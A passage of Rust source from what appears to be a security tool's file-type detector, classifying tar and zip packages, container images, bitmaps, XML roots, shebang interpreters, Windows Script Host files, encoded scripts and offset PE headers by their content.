        [0x80, 4 | 5, 0x95, frame @ ..] if frame.len() >= 8 => frame[5..8] == [0, 0, 0],
        _ if data.starts_with(TORCH_LEGACY_MAGIC) => true,
        [0x80, 2 | 3, ..] => matches!(
            lowercase_ext(path).as_deref(),
            Some("pkl" | "pickle" | "joblib" | "pt" | "pth")
        ),
        _ => false,
    }
}

/// Electron ASAR: a Chromium pickle holding the header size (`04 00 00 00`,
/// then the size), a second pickle whose payload is 4 bytes shorter, and the
/// JSON file table as its string.
fn looks_like_asar(data: &[u8]) -> bool {
    let u32_at = |off: usize| {
        data.get(off..off + 4)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    u32_at(0) == Some(4)
        && u32_at(4).is_some_and(|size| u32_at(8) == size.checked_sub(4))
        && data
            .get(16..)
            .is_some_and(|rest| rest.starts_with(b"{\"files\":"))
}

/// LZMA-alone (`.lzma`): the properties byte every mainstream encoder writes
/// (0x5D: lc=3, lp=0, pb=2), a dictionary size that `xz` and 7-Zip only ever
/// write as 2^n or 2^n + 2^(n-1) between 4 KiB and 1.5 GiB, and an
/// uncompressed size that is either unknown (all ones) or under 2^40. The
/// header has no magic, so all three must hold; Chromium's `.pak` resources
/// satisfy the last two.
fn looks_like_lzma_alone(data: &[u8]) -> bool {
    if data.len() < 14 || data[0] != 0x5D {
        return false;
    }
    let dict = u32::from_le_bytes([data[1], data[2], data[3], data[4]]);
    let size = u64::from_le_bytes([
        data[5], data[6], data[7], data[8], data[9], data[10], data[11], data[12],
    ]);
    let n = dict.trailing_zeros();
    let dict_ok = (12..=30).contains(&n) && (dict == 1 << n || dict == 3 << (n - 1));
    dict_ok && (size == u64::MAX || size < 1 << 40)
}

/// How far detection will inflate a gzip tar while reading its member names.
/// npm packages, sdists and crates name themselves anywhere under their one
/// root, and sdists often put `PKG-INFO` last, after generated clients, tests
/// and documentation, so this is generous; it still bounds a decompression
/// bomb.
const TAR_PEEK_LIMIT: u64 = 64 << 20;

/// How far detection will inflate a zstd tar. Its packages (FreeBSD, Arch,
/// Void) name themselves in their leading members.
const TAR_HEAD_LIMIT: u64 = 1 << 20;

/// Members a plain tar is read through for an image's markers; a `docker
/// save` bundle writes `manifest.json` after its layers.
const TAR_DEEP_MEMBERS: usize = 512;

/// Members read before a tar with several top-level entries is settled.
/// Every first-member and metadata marker sits within them.
const TAR_SHALLOW_MEMBERS: usize = 8;

/// What a container's decoded bytes turned out to be.
#[derive(Clone, Copy)]
enum Inside {
    /// The codec could not produce a first block: a truncated or corrupt
    /// stream, or no decoder linked. The content has not spoken.
    Unreadable,
    /// The stream decoded and is not a tar.
    NotTar,
    /// A tar, typed by its layout: a package, or plain [`FileType::Tar`].
    Tar(FileType),
}

/// What a tar's member names make it: a package with a fixed layout, or
/// plain [`FileType::Tar`]. `deep` reads on for container-image markers,
/// which only a plain tar can carry.
///
/// * First member: `<root>/gpkg-1` (Gentoo), `.SIGN.*` (Alpine),
///   `+COMPACT_MANIFEST`/`+MANIFEST` (FreeBSD), `props.plist` (Void).
/// * Anywhere: `.PKGINFO` with `.MTREE` or `.BUILDINFO` (Arch);
///   `metadata.gz` with `data.tar.gz` (gem); `oci-layout` with `index.json`,
///   or `manifest.json` with layers (OCI / `docker save`).
/// * One top-level directory holding `package/package.json` (npm),
///   `<root>/PKG-INFO` (Python sdist) or `<root>/Cargo.toml.orig` (crate).
fn tar_layout(mut reader: impl Read, deep: bool) -> Inside {
    // Read the first header block by hand, so a stream the codec cannot
    // decode is told apart from one that decodes to something else.
    let mut block = [0u8; 512];
    let mut filled = 0;
    while filled < block.len() {
        match reader.read(&mut block[filled..]) {
            Ok(0) => return Inside::NotTar,
            Ok(n) => filled += n,
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => {}
            Err(_) => return Inside::Unreadable,
        }
    }
    let mut archive = tar::Archive::new(std::io::Cursor::new(block).chain(reader));
    let Ok(mut entries) = archive.entries() else {
        return Inside::NotTar;
    };
    // Some while every member so far shares one top-level directory.
    let mut root: Option<Option<String>> = Some(None);
    let mut members = 0usize;
    let (mut pkginfo, mut arch_meta) = (false, false);
    let (mut gem_metadata, mut gem_data) = (false, false);
    let (mut oci_layout, mut oci_index) = (false, false);
    let (mut docker_manifest, mut docker_layers) = (false, false);
    loop {
        let entry = match entries.next() {
            Some(Ok(entry)) => entry,
            // A stream whose first header does not parse is not a tar.
            Some(Err(_)) if members == 0 => return Inside::NotTar,
            Some(Err(_)) | None => break,
        };
        if matches!(
            entry.header().entry_type(),
            tar::EntryType::XGlobalHeader
                | tar::EntryType::XHeader
                | tar::EntryType::GNULongName
                | tar::EntryType::GNULongLink
        ) {
            continue;
        }
        let Ok(path) = entry.path() else { continue };
        let path = path.to_string_lossy();
        let name = path.trim_start_matches("./").trim_end_matches('/');
        let (top, rest) = name.split_once('/').unwrap_or((name, ""));
        let base = name.rsplit('/').next().unwrap_or(name);
        // macOS AppleDouble sidecars that `tar` smuggles in are not members.
        if base.starts_with("._") || name.is_empty() {
            continue;
        }
        members += 1;

        if members == 1 {
            if base == "gpkg-1" && rest == "gpkg-1" {
                return Inside::Tar(FileType::GentooBinpkg);
            }
            if name.starts_with(".SIGN.") {
                return Inside::Tar(FileType::ApkAlpine);
            }
            if matches!(name, "+COMPACT_MANIFEST" | "+MANIFEST") {
                return Inside::Tar(FileType::PkgFreebsd);
            }
            if name == "props.plist" {
                return Inside::Tar(FileType::Xbps);
            }
        }
        match name {
            ".PKGINFO" => pkginfo = true,
            ".MTREE" | ".BUILDINFO" => arch_meta = true,
            "metadata.gz" => gem_metadata = true,
            "data.tar.gz" => gem_data = true,
            "oci-layout" => oci_layout = true,
            "index.json" => oci_index = true,
            "manifest.json" => docker_manifest = true,
            "repositories" => docker_layers = true,
            _ if name.ends_with("/layer.tar") || name.starts_with("blobs/") => {
                docker_layers = true;
            }
            _ => {}
        }
        if pkginfo && arch_meta {
            return Inside::Tar(FileType::PkgArch);
        }
        if gem_metadata && gem_data {
            return Inside::Tar(FileType::Gem);
        }
        if (oci_layout && oci_index) || (docker_manifest && docker_layers) {
            return Inside::Tar(FileType::OciImage);
        }

        match &mut root {
            Some(r @ None) => *r = Some(top.to_owned()),
            Some(Some(r)) if r != top => root = None,
            _ => {}
        }
        if let Some(Some(r)) = &root {
            match rest {
                "package.json" if r == "package" => return Inside::Tar(FileType::Npm),
                "PKG-INFO" => return Inside::Tar(FileType::PythonSdist),
                "Cargo.toml.orig" => return Inside::Tar(FileType::Crate),
                _ => {}
            }
        }
        // A single-root package may name itself last; the byte budget on
        // `reader` bounds that walk. Anything else is settled early.
        let cap = if deep {
            TAR_DEEP_MEMBERS
        } else if root.is_some() {
            usize::MAX
        } else {
            TAR_SHALLOW_MEMBERS
        };
        if members >= cap {
            break;
        }
    }
    if members > 0 {
        Inside::Tar(FileType::Tar)
    } else {
        Inside::NotTar
    }
}

/// Settle a file compressed with `compression`: the package its layout
/// names, else the package its name names on the same container, else the
/// generic tar. `None` when it is no tar at all. When the content could not be
/// read, only a name can say a tar is inside.
fn classify_tar(
    path: &Path,
    data: &[u8],
    compression: Compression,
    inside: Inside,
) -> Option<FileType> {
    let layout = match inside {
        Inside::NotTar => return None,
        Inside::Unreadable => None,
        Inside::Tar(ft) => Some(ft),
    };
    let fits = |ft: FileType| {
        container_of(ft, data)
            .is_some_and(|c| c.archive == ArchiveFormat::Tar && c.compression == compression)
    };
    if let Some(ft) = layout.filter(|&ft| ft != FileType::Tar && fits(ft)) {
        return Some(ft);
    }
    // `.apk` names Android's zip or Alpine's gzip tar; the container decides.
    let claim = if path_ends_with_ci(path, b".apk") {
        Some(FileType::ApkAlpine)
    } else {
        super::ext::detect_from_path(path)
    };
    if let Some(ft) = claim.filter(|&ft| fits(ft)) {
        return Some(ft);
    }
    layout.map(|_| match compression {
        Compression::Gzip => FileType::TarGz,
        Compression::Bzip2 => FileType::TarBz2,
        Compression::Xz => FileType::TarXz,
        Compression::Zstd => FileType::TarZst,
        _ => FileType::Tar,
    })
}

fn looks_like_github_actions_workflow(path: &Path, data: &[u8]) -> bool {
    if !(path_ends_with_ci(path, b".yml") || path_ends_with_ci(path, b".yaml")) {
        return false;
    }

    let Ok(text) = std::str::from_utf8(&data[..data.len().min(16 * 1024)]) else {
        return false;
    };

    let mut has_on = false;
    let mut has_jobs = false;
    for line in text.lines() {
        let line = line.trim_end();
        if line.is_empty() || line.starts_with("---") || line.starts_with('#') {
            continue;
        }
        if line.starts_with(' ') || line.starts_with('\t') {
            continue;
        }

        let Some((key, _)) = line.split_once(':') else {
            continue;
        };
        let key = key.trim_matches(|c| c == '\'' || c == '"' || c == ' ');
        match key {
            "on" => has_on = true,
            "jobs" => has_jobs = true,
            _ => {}
        }
        if has_on && has_jobs {
            return true;
        }
    }

    false
}

/// The entry names along a zip's local-header chain, in order.
///
/// A plain `memmem` for a member name answers a different question: whether
/// the bytes appear anywhere. They do whenever a zip stores an Office document
/// uncompressed, because the inner package's own header is then present
/// verbatim in the outer file -- which is how a zip holding one `.docx` came
/// to be identified as a `.docx`, and its members never walked.
///
/// So step from header to header by each entry's declared compressed size.
/// When the iterator ends, `complete` says whether it reached a real end of
/// chain (or the entry cap). A walk that lost the thread -- a streaming entry
/// with no size to step by, a header whose sizes are nonsense -- proves
/// nothing absent, and callers fall back to a looser test rather than
/// reporting a confident "no".
struct ZipNames<'a> {
    data: &'a [u8],
    /// The next local header, or `None` once the walk has stopped.
    off: Option<usize>,
    left: usize,
    complete: bool,
}

impl<'a> ZipNames<'a> {
    /// Entries to walk. A package names its content types first, but a
    /// marker such as an APK's `AndroidManifest.xml` sits wherever the
    /// packager put it: entry 905 in one 21 MB sample here. Each step is a
    /// bounds check and a few integer reads, so the ceiling is set by what a
    /// real archive holds rather than by what the walk costs.
    const MAX_ENTRIES: usize = 8192;

    fn new(data: &'a [u8]) -> Self {
        Self {
            data,
            off: Some(0),
            left: Self::MAX_ENTRIES,
            complete: false,
        }
    }
}

impl<'a> Iterator for ZipNames<'a> {
    type Item = &'a [u8];

    fn next(&mut self) -> Option<&'a [u8]> {
        let data = self.data;
        let off = self.off.take()?;
        if self.left == 0 {
            self.complete = true;
            return None;
        }
        self.left -= 1;
        let u16_at = |at: usize| {
            data.get(at..at + 2)
                .map(|b| u16::from_le_bytes([b[0], b[1]]) as usize)
        };
        let u32_at = |at: usize| {
            data.get(at..at + 4)
                .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]) as usize)
        };
        let sig = data.get(off..off + 4)?;
        if sig != b"PK\x03\x04" {
            // Only a real end-of-chain marker completes the walk. Anything else
            // means it lost the thread: the malformed packages this corpus is
            // full of are still Office documents, and saying otherwise routes
            // them to a reader that rejects them outright.
            self.complete = matches!(
                sig,
                b"PK\x01\x02" | b"PK\x05\x06" | b"PK\x06\x06" | b"PK\x06\x07"
            );
            return None;
        }
        let flags = u16_at(off + 6)?;
        let compressed = u32_at(off + 18)?;
        let name_len = u16_at(off + 26)?;
        let extra_len = u16_at(off + 28)?;
        let name = data.get(off + 30..off + 30 + name_len)?;
        // Bit 3: the sizes are repeated in a trailing data descriptor. When
        // the local header carries them too they can still be stepped by;
        // when it does not, there is nothing to step by and the walk stops.
        self.off = (flags & 0x08 == 0 || compressed != 0)
            .then(|| off.checked_add(30 + name_len + extra_len + compressed))
            .flatten()
            .filter(|&next| next <= data.len())
            .and_then(|next| {
                if flags & 0x08 == 0 || data.get(next..next + 4) != Some(b"PK\x07\x08") {
                    return Some(next);
                }
                // Signature + crc + two sizes, four bytes each, or eight each
                // in zip64. Which one is in use is not declared here, so take
                // the length that lands on something a chain continues with.
                [16usize, 24]
                    .into_iter()
                    .map(|skip| next + skip)
                    .find(|&at| {
                        matches!(
                            data.get(at..at + 4),
                            Some(b"PK\x03\x04" | b"PK\x01\x02" | b"PK\x05\x06")
                        )
                    })
            });
        Some(name)
    }
}

/// Whether `name` is an entry of this zip; `None` when the walk could not
/// finish without finding it.
#[cfg(test)]
fn zip_has_top_level_entry(data: &[u8], name: &[u8]) -> Option<bool> {
    let mut names = ZipNames::new(data);
    if names.any(|n| n == name) {
        return Some(true);
    }
    names.complete.then_some(false)
}

/// The members that name a zip-based package, gathered in one walk.
#[derive(Default)]
struct ZipMarks {
    android: bool,
    content_types: bool,
    mimetype: bool,
    vsix: bool,
    nuspec: bool,
    jar: bool,
    wheel: bool,
    egg: bool,
    ipa: bool,
    conda_metadata: bool,
    conda_info: bool,
    xpi: bool,
    complete: bool,
}

impl ZipMarks {
    fn scan(data: &[u8]) -> Self {
        let mut m = Self::default();
        let mut names = ZipNames::new(data);
        for name in names.by_ref() {
            let top_level = !name.contains(&b'/');
            match name {
                b"AndroidManifest.xml" => m.android = true,
                b"[Content_Types].xml" => m.content_types = true,
                b"mimetype" => m.mimetype = true,
                b"extension.vsixmanifest" => m.vsix = true,
                b"META-INF/MANIFEST.MF" => m.jar = true,
                b"EGG-INFO/PKG-INFO" => m.egg = true,
                b"metadata.json" => m.conda_metadata = true,
                b"install.rdf" | b"META-INF/mozilla.rsa" => m.xpi = true,
                _ if top_level && name.ends_with(b".nuspec") => m.nuspec = true,
                _ if top_level && name.starts_with(b"info-") && name.ends_with(b".tar.zst") => {
                    m.conda_info = true;
                }
                _ if name
                    .strip_suffix(b".dist-info/WHEEL")
                    .is_some_and(|dir| !dir.is_empty() && !dir.contains(&b'/')) =>
                {
                    m.wheel = true;
                }
                _ if name.starts_with(b"Payload/")
                    && memchr::memmem::find(name, b".app/").is_some() =>
                {
                    m.ipa = true;
                }
                _ => {}
            }
        }
        m.complete = names.complete;
        m
    }
}

/// Names that claim an archive, not a document: a zip so named holding an
/// OPC `[Content_Types].xml` stays the archive it says it is.
const ARCHIVE_EXTS: &[&str] = &[
    "zip",
    "jar",
    "war",
    "ear",
    "vsix",
    "nupkg",
    "xpi",
    "whl",
    "epub",
    "apk",
    "ipa",
    "aar",
    "egg",
    "phar",
    "pyz",
    "conda",
    "msix",
    "appx",
    "msixbundle",
    "appxbundle",
    "aab",
    "apks",
    "xapk",
    "cbz",
];

/// The zip-based package a name claims, trusted when no member contradicts
/// it. Office names are absent on purpose: an office extension is a claim,
/// not the format, and without the OPC marker the file is a zip.
fn zip_name_claim(ext: &str) -> Option<FileType> {
    Some(match ext {
        "jar" | "war" | "ear" => FileType::Jar,
        "xpi" => FileType::Xpi,
        "whl" => FileType::Whl,
        "apk" => FileType::ApkAndroid,
        "conda" => FileType::Conda,
        "egg" => FileType::Egg,
        "nupkg" => FileType::Nupkg,
        "ipa" => FileType::Ipa,
        "vsix" => FileType::Vsix,
        "odt" | "ods" | "odp" | "odg" | "odf" | "ott" | "ots" | "otp" | "odm" | "oth" | "otg"
        | "odb" | "odc" | "odi" => FileType::Odf,
        _ => return None,
    })
}

/// Classify a zip by the members only one kind of package carries; the name
/// settles only what the members leave open.
///
/// That order decides whether anything looks inside. A file typed Ooxml goes
/// to the office analyzer, which reads OPC parts; a file typed Zip goes to the
/// archive analyzer, which walks the members. Three samples here are zips
/// holding one payload apiece -- a `documents.doc` under an `.xlsm` name, a
/// `.pdf.url` shortcut beside a decoy docx -- and none of those members were
/// analyzed while the name was believed. And an APK, JAR or NuGet package
/// delivered without its extension reached none of its own analysis.
fn classify_pk(path: &Path, data: &[u8]) -> (FileType, DetectionSource) {
    let ext = lowercase_ext(path);
    let ext = ext.as_deref().unwrap_or("");
    let m = ZipMarks::scan(data);
    // Where the walk lost the thread, a marker's bytes anywhere are the best
    // evidence left.
    let loose = |marker: &[u8]| !m.complete && memchr::memmem::find(data, marker).is_some();
    let opc = m.content_types || loose(b"[Content_Types].xml");
    // An OpenDocument file stores `mimetype` first; an Android package can
    // carry the namespace URI in any of its resources and is not one.
    let odf =
        m.mimetype && memchr::memmem::find(data, b"application/vnd.oasis.opendocument.").is_some();

    let ft = if m.android {
        FileType::ApkAndroid
    } else if m.vsix || loose(b"extension.vsixmanifest") {
        // VSIX and NuGet are OPC zips too; their manifests win.
        FileType::Vsix
    } else if opc && m.nuspec {
        FileType::Nupkg
    } else if opc && !ARCHIVE_EXTS.contains(&ext) {
        FileType::Ooxml
    } else if odf {
        FileType::Odf
    } else if let Some(claimed) = zip_name_claim(ext) {
        claimed
    } else if m.ipa {
        FileType::Ipa
    } else if m.wheel {
        FileType::Whl
    } else if m.egg {
        FileType::Egg
    } else if m.conda_metadata && m.conda_info {
        FileType::Conda
    } else if m.xpi {
        FileType::Xpi
    } else if m.jar {
        FileType::Jar
    } else {
        FileType::Zip
    };
    (ft, DetectionSource::Magic)
}

/// Lowercase extension into a stack buffer. Returns None if no extension or too long.
fn lowercase_ext(path: &Path) -> Option<String> {
    let ext = path.extension()?.to_str()?;
    if ext.len() > 16 {
        return None;
    }
    let mut buf = [0u8; 16];
    buf[..ext.len()].copy_from_slice(ext.as_bytes());
    buf[..ext.len()].make_ascii_lowercase();
    // Input was valid UTF-8 ASCII, lowering preserves that.
    let Ok(ext) = std::str::from_utf8(&buf[..ext.len()]) else {
        return None;
    };
    Some(ext.to_string())
}

/// A Windows bitmap: `BM`, then the info header that follows the 14-byte file
/// header. `BM` alone is two letters, and the file-size field is routinely
/// wrong in real bitmaps (truncated downloads, writers that leave it zero), so
/// the claim rests on the info header instead: its size field names one of the
/// header versions Windows and OS/2 defined, it has one colour plane, and its
/// pixel depth is one a decoder accepts.
fn looks_like_bmp(data: &[u8]) -> bool {
    data.starts_with(b"BM") && data.len() > 14 && looks_like_dib_header(&data[14..])
}

/// A bitmap info header (`BITMAPCOREHEADER` through `BITMAPV5HEADER`, and
/// OS/2's variants). This is also the whole start of a headerless `.dib`.
pub(crate) fn looks_like_dib_header(dib: &[u8]) -> bool {
    let u16_at = |i: usize| dib.get(i..i + 2).map(|b| u16::from_le_bytes([b[0], b[1]]));
    let Some(size) = dib
        .get(..4)
        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    else {
        return false;
    };
    // The 12-byte core header has 16-bit dimensions; every later one 32-bit.
    let (planes, bits) = match size {
        12 => (u16_at(8), u16_at(10)),
        16 | 40 | 52 | 56 | 64 | 108 | 124 => (u16_at(12), u16_at(14)),
        _ => return false,
    };
    planes == Some(1) && matches!(bits, Some(0 | 1 | 2 | 4 | 8 | 16 | 24 | 32 | 48 | 64))
}

/// How far into a Windows Script Host document the `<script>` element is
/// looked for. Droppers pad the opening tags with whitespace.
const WSH_SCRIPT_WINDOW: usize = 64 * 1024;

/// A `.wsf` / `.wsc` / `.sct` document, typed by the language of its first
/// `<script>`: VBScript or JScript. The root element decides it is one --
/// `<job>`, `<package>`, `<component>` or `<scriptlet>`; an HTML page with a
/// VBScript block stays HTML.
fn windows_script_host(data: &[u8]) -> Option<FileType> {
    // These are written by hand in Notepad as often as by tools, UTF-16 included.
    let decoded;
    let data = if data.starts_with(b"\xFF\xFE") || data.starts_with(b"\xFE\xFF") {
        decoded = super::heuristics::decoded_text(data)?;
        &decoded[..]
    } else {
        data
    };
    // `<!-- :` is cmd.exe's half of a batch/WSF hybrid: the batch lines hide
    // in that comment, and cmd.exe runs them first. The batch grammar decides.
    let opening = data.trim_ascii_start();
    if opening.len() >= 6 && opening[..6].eq_ignore_ascii_case(b"<!-- :") {
        return None;
    }
    let head = xml_head(data)?;
    let root = head.root?;
    if !["job", "package", "component", "scriptlet"]
        .iter()
        .any(|r| root.eq_ignore_ascii_case(r.as_bytes()))
    {
        return None;
    }
    let window = &data[..data.len().min(WSH_SCRIPT_WINDOW)];
    let mut from = 0;
    while let Some(at) = find_ci(&window[from..], b"<script") {
        let tag_start = from + at + b"<script".len();
        let tag = &window[tag_start..];
        let tag = &tag[..memchr::memchr(b'>', tag).unwrap_or(tag.len())];
        if let Some(language) = attribute_value(tag, b"language") {
            let language = decode_char_refs(language).to_ascii_lowercase();
            if language.starts_with("vbs") {
                return Some(FileType::Vbs);
            }
            if language.starts_with("jscript") || language.starts_with("javascript") {
                return Some(FileType::JavaScript);
            }
        }
        from = tag_start;
    }
    None
}

/// The value of `name="..."` (or single-quoted) inside a tag, whitespace
/// around the `=` allowed.
fn attribute_value<'a>(tag: &'a [u8], name: &[u8]) -> Option<&'a [u8]> {
    let mut from = 0;
    while let Some(at) = find_ci(&tag[from..], name) {
        let start = from + at;
        let rest = tag[start + name.len()..].trim_ascii_start();
        let boundary = start == 0 || tag[start - 1].is_ascii_whitespace();
        if let (true, Some(value)) = (boundary, rest.strip_prefix(b"=")) {
            let value = value.trim_ascii_start();
            let quote = *value.first()?;
            if quote == b'"' || quote == b'\'' {
                let inner = &value[1..];
                return Some(&inner[..memchr::memchr(quote, inner).unwrap_or(inner.len())]);
            }
            let end = value
                .iter()
                .position(|b| b.is_ascii_whitespace() || *b == b'/')
                .unwrap_or(value.len());
            return Some(&value[..end]);
        }
        from = start + name.len();
    }
    None
}

/// Resolve `&#86;` / `&#x56;` character references, which obfuscated
/// scriptlets use to spell `VBScript` without the letters.
fn decode_char_refs(value: &[u8]) -> String {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some((&b, tail)) = rest.split_first() {
        if b == b'&' && tail.first() == Some(&b'#') {
            if let Some(end) = tail.iter().position(|&c| c == b';') {
                let digits = std::str::from_utf8(&tail[1..end]).unwrap_or("");
                let code = match digits.strip_prefix(['x', 'X']) {
                    Some(hex) => u32::from_str_radix(hex, 16).ok(),
                    None => digits.parse().ok(),
                };
                if let Some(c) = code.and_then(char::from_u32) {
                    out.push(c);
                    rest = &tail[end + 1..];
                    continue;
                }
            }
        }
        out.push(char::from(b));
        rest = tail;
    }
    out
}

fn find_ci(hay: &[u8], needle: &[u8]) -> Option<usize> {
    hay.windows(needle.len())
        .position(|w| w.eq_ignore_ascii_case(needle))
}

/// Script Encoder output: `#@~^` + base64 length + `==`. The cipher hides
/// which language was encoded, so the one call the bytes cannot make falls to
/// the name: `.jse` is JScript, anything else the far more common VBScript.
fn encoded_script(path: &Path, head: &[u8]) -> Option<FileType> {
    let head = head.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(head);
    let rest = head.strip_prefix(b"#@~^")?;
    let length = rest.get(..6)?;
    if !length
        .iter()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/'))
        || rest.get(6..8) != Some(b"==")
    {
        return None;
    }
    let jse = path
        .extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| e.eq_ignore_ascii_case("jse"));
    Some(if jse {
        FileType::JavaScript
    } else {
        FileType::Vbs
    })
}

/// Type a markup document by its root element: `plist`, `svg`, a known XML
/// vocabulary, or any document with an `<?xml` prolog. HTML is claimed
/// earlier and by the heuristics, not here.
fn detect_xml(data: &[u8]) -> Option<(FileType, DetectionSource)> {
    let head = xml_head(data)?;
    let ft = match head.root {
        Some(b"plist") => FileType::Plist,
        Some(b"svg") => FileType::Svg,
        // MSBuild projects often omit the prolog and open with `<Project`;
        // the namespace keeps some other `<Project>` out.
        Some(b"Project")
            if memchr::memmem::find(head.text, b"schemas.microsoft.com/developer/msbuild")
                .is_some() =>
        {
            FileType::Xml
        }
        Some(
            b"rss" | b"feed" | b"RDF" | b"rdf:RDF" | b"configuration" | b"Configuration"
            | b"manifest",
        ) => FileType::Xml,
        _ if head.prolog => FileType::Xml,
        _ => return None,
    };
    Some((ft, DetectionSource::Magic))
}

/// How far into a document [`xml_head`] looks for the root element.
const XML_HEAD: usize = 1024;

/// The opening of a markup document, read the way a parser reads it.
struct XmlHead<'a> {
    /// The bytes read.
    text: &'a [u8],
    /// Whether an `<?xml` declaration came first.
    prolog: bool,
    /// The root element's name: the first element, or the doctype's name when
    /// the head ends before any element. `None` when the two disagree -- a
    /// document that contradicts itself is claimed by neither.
    root: Option<&'a [u8]>,
}

/// Read past a BOM, whitespace, processing instructions, comments and the
/// doctype to the root element. `None` unless the document opens with `<`.
fn xml_head(data: &[u8]) -> Option<XmlHead<'_>> {
    let text = &data[..data.len().min(XML_HEAD)];
    let mut rest = text
        .strip_prefix(b"\xEF\xBB\xBF")
        .unwrap_or(text)
        .trim_ascii_start();
    if !rest.starts_with(b"<") {
        return None;
    }
    let prolog = rest.starts_with(b"<?xml");
    let mut doctype = None;
    let element = loop {
        rest = rest.trim_ascii_start();
        let close: &[u8] = if rest.starts_with(b"<?") {
            b"?>"
        } else if rest.starts_with(b"<!--") {
            b"-->"
        } else if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case(b"<!DOCTYPE") {
            doctype = Some(markup_name(rest[9..].trim_ascii_start()));
            b">"
        } else if rest.starts_with(b"<!") {
            b">"
        } else if rest.starts_with(b"<") {
            break Some(markup_name(&rest[1..]));
        } else {
            break None;
        };
        match memchr::memmem::find(rest, close) {
            Some(end) => rest = &rest[end + close.len()..],
            None => break None,
        }
    };
    let root = match (doctype, element) {
        (Some(d), Some(e)) if d != e => None,
        (d, e) => e.or(d),
    };
    Some(XmlHead {
        text,
        prolog,
        root: root.filter(|r| !r.is_empty()),
    })
}

/// The name that opens `bytes`, up to whitespace, `>`, `/` or `[`.
fn markup_name(bytes: &[u8]) -> &[u8] {
    let end = bytes
        .iter()
        .position(|&b| b.is_ascii_whitespace() || matches!(b, b'>' | b'/' | b'['))
        .unwrap_or(bytes.len());
    &bytes[..end]
}

/// Detect shebang-based file types.
///
/// Reads the line the way the kernel does: the first word is the interpreter
/// path, and only its basename matters. A launcher (`env`, `busybox`) defers
/// to the first word after its own options.
fn detect_shebang(data: &[u8]) -> Option<(FileType, DetectionSource)> {
    // The kernel reads a shebang line through BINPRM_BUF_SIZE (256 bytes).
    let limit = data.len().min(256);
    let line_end = memchr::memchr(b'\n', &data[..limit]).unwrap_or(limit);
    // Any whitespace ends a word, not just space and tab: a CRLF script's
    // `#!/usr/bin/perl\r` names perl, whatever the kernel makes of the `\r`.
    let mut words = data[2..line_end]
        .split(|&b| b.is_ascii_whitespace() || b == 0)
        .filter(|w| !w.is_empty());
    let mut name = basename(words.next()?);
    if name == b"env" || name == b"busybox" {
        name = basename(launched_interpreter(&mut words)?);
    }
    // `python3.11`, `perl5.36`, `ruby3.2` and `ksh93` are the same languages.
    let versioned = name
        .iter()
        .rev()
        .take_while(|&&b| b.is_ascii_digit() || b == b'.')
        .count();
    let file_type = match &name[..name.len() - versioned] {
        b"sh" | b"bash" | b"rbash" | b"zsh" | b"dash" | b"ash" | b"ksh" | b"mksh" | b"yash"
        | b"fish" | b"tcsh" | b"csh" | b"atf-sh" => FileType::Shell,
        // debian/rules and friends: `#!/usr/bin/make -f`. Without this the
        // content heuristics mis-type make scripts as source code.
        b"make" | b"gmake" => FileType::Makefile,
        b"python" | b"pypy" => FileType::Python,
        b"node" | b"nodejs" | b"deno" | b"bun" => FileType::JavaScript,
        b"ts-node" | b"tsx" => FileType::TypeScript,
        b"ruby" | b"jruby" => FileType::Ruby,
        b"perl" => FileType::Perl,
        b"php" => FileType::Php,
        b"lua" | b"luajit" => FileType::Lua,
        b"pwsh" | b"powershell" => FileType::PowerShell,
        // JXA is `osascript -l JavaScript`; the body is JavaScript, and typing
        // it AppleScript would hide it from every JavaScript rule.
        b"osascript" if words.any(|w| w.eq_ignore_ascii_case(b"JavaScript")) => {
            FileType::JavaScript
        }
        b"osascript" => FileType::AppleScript,
        b"elixir" => FileType::Elixir,
        b"groovy" => FileType::Groovy,
        b"scala" => FileType::Scala,
        b"kotlin" | b"kscript" => FileType::Kotlin,
        b"swift" => FileType::Swift,
        // Babashka runs Clojure.
        b"bb" => FileType::Clojure,
        _ => return None,
    };
    Some((file_type, DetectionSource::Shebang))
}

/// The path segment after the last `/`.
fn basename(path: &[u8]) -> &[u8] {
    memchr::memrchr(b'/', path).map_or(path, |p| &path[p + 1..])
}

/// The interpreter a launcher runs: the first word that is neither an option
/// nor a `NAME=value` assignment, as in `env -S perl -w` or `env -u X python3`.
fn launched_interpreter<'a>(words: &mut impl Iterator<Item = &'a [u8]>) -> Option<&'a [u8]> {
    while let Some(word) = words.next() {
        match word {
            // env options that consume the next word as their argument.
            b"-u" | b"--unset" | b"-C" | b"--chdir" => {
                words.next();
            }
            _ if word.starts_with(b"-") || word.contains(&b'=') => {}
            _ => return Some(word),
        }
    }
    None
}

/// Detect tampered PE: MZ within first 64 bytes with valid PE\0\0 signature.
fn detect_tampered_pe(data: &[u8]) -> Option<FileType> {
    let search_limit = data.len().min(64);
    if search_limit < 3 {
        return None;
    }
    // Use memchr to find 'M' bytes instead of scanning byte-by-byte
    let mut pos = 1; // skip position 0 (already checked by MZ branch)
    while let Some(offset) = memchr::memchr(b'M', &data[pos..search_limit.saturating_sub(1)]) {
        let i = pos + offset;
        if data.get(i + 1) == Some(&b'Z') {
            let pe_data = &data[i..];
            if pe_data.len() >= 0x40 {
                let e_lfanew = u32::from_le_bytes([
                    pe_data[0x3C],
                    pe_data[0x3D],
                    pe_data[0x3E],
                    pe_data[0x3F],
                ]) as usize;
                if e_lfanew + 4 <= pe_data.len() && pe_data[e_lfanew..e_lfanew + 4] == *b"PE\0\0" {
                    return Some(FileType::Pe);
                }
            }
        }
        pos = i + 1;
    }
    None
}

/// Detect manifest file types that require content inspection.
fn detect_manifest(path: &Path, data: &[u8]) -> Option<FileType> {
    let file_name = path.file_name()?.to_str()?;

    // Stack-allocated lowercase (manifest names are short)
    let mut buf = [0u8; 32];
    let len = file_name.len().min(buf.len());
    buf[..len].copy_from_slice(&file_name.as_bytes()[..len]);
    buf[..len].make_ascii_lowercase();
    let name = std::str::from_utf8(&buf[..len]).unwrap_or("");

    match name {
        "package.json" => Some(FileType::PackageJson),
        "package-lock.json" => Some(FileType::PackageLockJson),
        "go.mod" => Some(FileType::GoMod),
        "go.sum" => Some(FileType::GoSum),
